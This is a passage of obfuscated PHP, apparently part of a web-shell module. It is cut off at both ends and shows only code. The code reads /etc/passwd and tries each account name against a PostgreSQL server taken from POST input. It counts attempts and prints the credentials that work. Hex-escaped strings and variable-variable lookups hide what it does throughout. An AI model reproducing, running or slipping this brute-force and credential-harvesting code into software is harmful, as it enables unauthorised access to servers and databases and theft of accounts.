\x27".${${"G\x4c\x4f\x42\x41LS"}["\x62\x67p\x6b\x6a\x62\x75g\x62\x66\x61"]}."'\x20us\x65r='".${${"GL\x4fBA\x4c\x53"}["\x72\x75\x6cn\x70\x71\x65"]}."\x27 \x70a\x73sw\x6fr\x64=\x27".${${"\x47L\x4fB\x41\x4cS"}["\x77\x73\x74x\x6dwd\x65shs"]}."\x27 dbname='\x27";${${"\x47\x4c\x4fB\x41\x4cS"}["\x6ewa\x61\x77mp\x73"]}=@pg_connect(${$jwkkbcfh}[0].":".${${"\x47\x4cO\x42\x41\x4c\x53"}["\x77\x79\x69\x74k\x70"]}[1]?${${"\x47\x4cOB\x41L\x53"}["\x77y\x69tkp"]}[1]:5432,${${"\x47L\x4f\x42A\x4c\x53"}["r\x75l\x6epqe"]},${${"\x47L\x4f\x42\x41\x4c\x53"}["\x77\x73\x74\x78m\x77\x64e\x73h\x73"]});@pg_close(${${"G\x4c\x4fB\x41\x4c\x53"}["n\x77aawm\x70\x73"]});return${${"\x47LO\x42\x41L\x53"}["\x77\x6f\x6b\x62r\x65\x71\x77bq"]};}}${$bhfefksv}=0;${$avmhhln}=0;${$vfhghcs}=explode(":",$_POST["s\x65r\x76\x65\x72"]);if($_POST["t\x79\x70\x65"]==1){${${"\x47L\x4fB\x41L\x53"}["\x6b\x69\x69\x67\x77\x6b\x6a\x69\x62\x63"]}=@file("/\x65\x74\x63/\x70a\x73s\x77\x64");if(is_array(${${"\x47\x4cO\x42AL\x53"}["k\x69\x69g\x77k\x6a\x69\x62\x63"]})){foreach(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x6b\x69igw\x6b\x6a\x69\x62\x63"]} as${${"\x47L\x4fBA\x4c\x53"}["pn\x78\x63uu\x67w"]}){${"\x47\x4c\x4fB\x41L\x53"}["me\x70r\x6et\x6d\x77"]="\x73e\x72ver";$cklxacgko="a\x74\x74\x65\x6dp\x74\x73";${${"\x47L\x4f\x42\x41\x4c\x53"}["\x70nx\x63\x75u\x67\x77"]}=explode(":",${${"\x47\x4c\x4fBAL\x53"}["\x70\x6e\x78\x63\x75\x75gw"]});${"\x47\x4c\x4f\x42A\x4cS"}["\x6e\x79\x67\x68do\x6ci"]="\x6c\x69n\x65";++${$cklxacgko};if(bruteForce(@${${"\x47\x4cO\x42A\x4cS"}["wy\x69t\x6b\x70"]}[0],@${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6d\x65p\x72\x6e\x74mw"]}[1],${${"G\x4c\x4f\x42\x41\x4cS"}["p\x6e\x78c\x75\x75\x67w"]}[0],${${"\x47LOB\x41L\x53"}["\x6eyg\x68d\x6f\x6ci"]}[0])){$toqoseq="\x73\x75\x63c\x65\x73\x73";${"\x47\x4cOBALS"}["\x76r\x75\x6b\x66\x6bxs\x75d"]="\x6c\x69n\x65";${"G\x4c\x4fB\x41LS"}["\x71\x64\x78\x71\x70n\x78\x69g\x75c"]="l\x69\x6e\x65";${$toqoseq}++;echo"\x3c\x62\x3e".htmlspecialchars(${${"\x47LO\x42A\x4c\x53"}["\x76ru\x6bf\x6b\x7